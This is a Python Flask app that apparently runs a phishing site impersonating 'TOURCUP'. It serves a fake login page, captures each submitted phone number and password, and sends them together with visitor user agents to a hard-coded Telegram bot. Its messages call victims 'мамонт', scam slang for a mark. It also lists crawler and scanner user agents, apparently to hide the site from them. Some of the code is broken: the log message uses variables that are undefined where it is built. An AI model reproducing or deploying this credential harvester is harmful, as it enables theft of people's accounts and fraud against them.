from flask import Flask, render_template, request, redirect, send_file
import json, requests
from urllib.request import Request, urlopen

app = Flask(__name__)

TOKEN = '6114773413:AAFlXzRw2PhkJ4Pq5vVeTC_vKQgJuvX47fE'
CHAT_ID = '660502874'
domain = "tourcup.ru"
websiteName = "TOURCUP"



LOG_MESSAGE = f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password} \n '






app.jinja_env.globals.update(websiteName = websiteName)

def send(text = ""):
    try:
        with requests.Session() as session:
            session.headers['Accept'] = 'text/html,app/xhtml+xml,app/xml;q=0.9,*/*;q=0.8'
            session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'

            url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}'
            session.post(url, data={'text': f"{text}"})
    except Exception as e:
        print(e)

def shortNick(nickname = None, length = 10):
    textCleared = nickname[0:length]

    if not textCleared == nickname:
        textCleared = f"{textCleared}..."

    return textCleared

@app.route("/tracker", methods=['POST'])
def tracker():
    user_agent = str(request.headers.get('User-Agent'))

    clear_words = {
        "(Windows NT 10.0; Win64; x64)": "",
        "(KHTML, like Gecko)": "",
        "AppleWebKit/537.36": "",
        "Mozilla/5.0 ": "",
        "/": " ",
        "(": "",
        ")": "",
        "   ": "",
        "  ": " ",
    }

    for i, j in clear_words.items():
        user_agent = user_agent.replace(i, j)

    url = request.args.get('url')
    blocked_user_agents = [
        "YandexBot",
        "uptimerobot.com",
        "Googlebot",
        "DirBuster",
        "Go-http-client",
        "GuzzleHttp",
        "None",
        "Vercelbot",
        "checklyhq.com",
        "serpstatbot",
        "HeadlessChrome",
        "Twitterbot",
        "AhrefsBot"
    ]

    send(f"{shortNick(user_agent, 80)} — {url}")

    return redirect("/")

@app.errorhandler(404)
def page_not_found(e):
    return redirect("/")

@app.errorhandler(405)
def method_not_allowed(e):
    return redirect("/")

@app.errorhandler(500)
def getting_error(e):
    send("#ошибка\nПроверьте логи!")
    return redirect("/")

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    return render_template('auth.html')

@app.route("/callback", methods=['POST'])
def page():
    number = request.form['login']
    password = request.form['password']

    if number == "" or password == "":
        return render_template('auth.html', error = "Заполните пустые поля!")

    elif len(number) < 9 or len(password) < 6:
        return render_template('auth.html', error = "Заполните поля правильно!")

    send(LOG_MESSAGE)

    return redirect("/")

@app.route("/", methods=['GET', 'POST'])
def reg():
    return render_template('index.html')

if __name__ == "__main__":
    app.run('0.0.0.0', debug = True)